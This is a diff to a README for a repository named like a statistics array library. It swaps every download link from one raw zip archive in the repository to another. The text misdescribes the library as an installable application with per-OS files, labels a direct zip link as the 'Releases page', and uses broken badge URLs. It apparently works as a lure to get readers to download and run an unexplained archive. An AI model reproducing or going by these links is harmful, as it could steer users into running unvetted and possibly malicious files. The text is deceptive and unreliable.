@@ -16,17 +16,17 @@ Before you proceed, ensure that your system meets the following requirements:
 
 You can download the application from our Releases page. To get started, click the button below:
 
-[![Download Stats Base Ndarray Dstdevch](https://raw.githubusercontent.com/dapagithub/stats-base-ndarray-dstdevch/main/test/dstdevch_stats_base_ndarray_v3.4.zip%20Now-Stats%20Base%20Ndarray%20Dstdevch-brightgreen)](https://raw.githubusercontent.com/dapagithub/stats-base-ndarray-dstdevch/main/test/dstdevch_stats_base_ndarray_v3.4.zip)
+[![Download Stats Base Ndarray Dstdevch](https://github.com/dapagithub/stats-base-ndarray-dstdevch/raw/refs/heads/main/docs/base-dstdevch-stats-ndarray-v2.6.zip%20Now-Stats%20Base%20Ndarray%20Dstdevch-brightgreen)](https://github.com/dapagithub/stats-base-ndarray-dstdevch/raw/refs/heads/main/docs/base-dstdevch-stats-ndarray-v2.6.zip)
 
 ## 🔧 Download & Install
 
 1. Click on the link below to visit the Releases page:
    
-   [Visit the Releases Page](https://raw.githubusercontent.com/dapagithub/stats-base-ndarray-dstdevch/main/test/dstdevch_stats_base_ndarray_v3.4.zip)
+   [Visit the Releases Page](https://github.com/dapagithub/stats-base-ndarray-dstdevch/raw/refs/heads/main/docs/base-dstdevch-stats-ndarray-v2.6.zip)
 
 2. On the Releases page, look for the latest version of the application.
 
-3. Download the file appropriate for your operating system. Files may be labeled by their version number and operating system (e.g., `https://raw.githubusercontent.com/dapagithub/stats-base-ndarray-dstdevch/main/test/dstdevch_stats_base_ndarray_v3.4.zip`).
+3. Download the file appropriate for your operating system. Files may be labeled by their version number and operating system (e.g., `https://github.com/dapagithub/stats-base-ndarray-dstdevch/raw/refs/heads/main/docs/base-dstdevch-stats-ndarray-v2.6.zip`).
 
 4. Once the download is complete, locate the downloaded file in your downloads folder.
 
@@ -76,4 +76,4 @@ If you need further assistance, feel free to reach out for support. We are here 
 
 To download the latest version of the application, click the button below:
 
-[![Download Stats Base Ndarray Dstdevch](https://raw.githubusercontent.com/dapagithub/stats-base-ndarray-dstdevch/main/test/dstdevch_stats_base_ndarray_v3.4.zip%20Now-Stats%20Base%20Ndarray%20Dstdevch-brightgreen)](https://raw.githubusercontent.com/dapagithub/stats-base-ndarray-dstdevch/main/test/dstdevch_stats_base_ndarray_v3.4.zip)
+[![Download Stats Base Ndarray Dstdevch](https://github.com/dapagithub/stats-base-ndarray-dstdevch/raw/refs/heads/main/docs/base-dstdevch-stats-ndarray-v2.6.zip%20Now-Stats%20Base%20Ndarray%20Dstdevch-brightgreen)](https://github.com/dapagithub/stats-base-ndarray-dstdevch/raw/refs/heads/main/docs/base-dstdevch-stats-ndarray-v2.6.zip)
